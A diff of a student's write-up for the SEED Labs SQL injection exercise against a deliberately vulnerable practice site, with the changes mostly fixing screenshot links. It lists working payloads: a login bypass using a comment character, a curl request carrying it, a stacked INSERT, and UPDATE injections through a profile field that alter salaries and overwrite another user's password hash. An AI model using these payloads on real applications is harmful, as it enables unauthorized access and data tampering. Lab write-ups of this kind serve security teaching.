@@ -7,10 +7,10 @@
 	Use such a SQL query:
 //code
 		select * from credential where Name='Alice';
-https://github.com/hasseb001/SQLInjection/blob/main/task%201.png
+https://github.com/hasseb001/SQL-Injection/blob/main/task%201.png
 
-Task 2:
---> Task 2.1
+### Task 2:
+### --> Task 2.1
 	.USERNAME: "Admin' #"
 	.PASSWORD: "xyz" (here is password is optional)
 
@@ -19,22 +19,22 @@ Task 2:
 		SELECT id, name, eid, salary, birth, ssn, address, email, nickname, password
 		FROM credential
 		WHERE name='Admin' #' && password='xyz'
+https://github.com/hasseb001/SQL-Injection/blob/main/task%202.1.png
 ### --> Task 2.2
 	1- Write Code on Terminator in Seed Lab:
 	curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23';
 	2- Copy the HTML code.
 	3- Make a new file in location "file:///home/seed/Documents/temp.html"
 	4. Run this location on browser
-https://github.com/hasseb001/SQLInjection/blob/main/task%202.1.png
-
-###--> Task 2.3	
+https://github.com/hasseb001/SQL-Injection/blob/main/task%202.2.png
+### --> Task 2.3	
 	inject statment to append a row to current database:
 //code	
 	INSERT INTO credential (name,eid) VALUES('Waleed', '17422');
 	After row inserted, go to browser and input as:
 	.USERNAME: "1=1; INSERT INTO credential (name,eid) VALUES('Waleed','17422') #"
 	.PASSWORD: "" (blank field)
-https://github.com/hasseb001/SQLInjection/blob/main/task%202.2.png
+https://github.com/hasseb001/SQL-Injection/blob/main/task%202.3.png
 (optional lines)
 	PHP's mysqli extension, involes mysqli::query API to handle SQL statement,
 doesn't support for multiple queries with in the same run. Of course, the design of this API 
@@ -43,14 +43,14 @@ attributes to concern of SQL injection.
 ### Task 3
 EDIT profile can be run on line "http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php" to browser
 
-### -> Task 3.1
+### --> Task 3.1
 	1- Login as Username= 'Alice' && Password = xyz, 
 	2- Then edit the link to browser http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php
 	3- Update Phone Number as ', Salary=1000000 and save.
 ### --> Task 3.2
 	1- Login as Username= 'Boby' #' and then open edit profile
 	2- Update Phone Number: ',Salary=0 and remaining unchanges
-https://github.com/hasseb001/SQLInjection/blob/main/task%202.3.png
+https://github.com/hasseb001/SQL-Injection/blob/main/task%203.2.png
 	Login as Alice
 		Assume login as Boby and keep Alice login too. Open Alice profile edit
 	Update Phone Number: ', Salary=1 where name='Boby' #
@@ -81,4 +81,4 @@ Let Boby password as '123'. We must get SHA1 value of new password via some tool
 Constuct Phone Number:
 	', password='c0b656d5e415ca1a8e098a408f913ec229e120b6' where name='Boby' #
 Save it and changes works accordingly. 
-https://github.com/hasseb001/SQLInjection/blob/main/task%203.3.png
+https://github.com/hasseb001/SQL-Injection/blob/main/task%203.3.png
